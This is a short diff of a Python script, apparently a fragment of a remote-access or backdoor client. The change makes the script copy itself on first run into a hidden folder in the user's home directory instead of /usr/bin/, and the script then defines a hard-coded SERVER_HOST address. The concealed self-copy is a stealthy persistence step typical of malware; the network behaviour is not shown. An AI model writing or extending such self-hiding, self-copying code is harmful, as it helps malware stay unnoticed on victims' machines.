@@ -12,18 +12,16 @@ def first_time():
     current_script_path = os.path.realpath(__file__)
 
     # the directory where the script will be copied
-    copy_directory = "/usr/bin/"
+    copy_directory = os.path.expanduser("~/.hidden_directory")
 
-    # check if the directory exists, create it if it doesn't
-    if not os.path.exists(copy_directory):
-        os.makedirs(copy_directory)
+    # create the directory if it does not exist
+    os.makedirs(copy_directory, exist_ok=True)
 
     # the path of the copied script
     copy_script_path = os.path.join(copy_directory, "example.py")
 
     # copy the script
     shutil.copy2(current_script_path, copy_script_path)
-
 first_time()
 
 SERVER_HOST = "192.168.1.17"
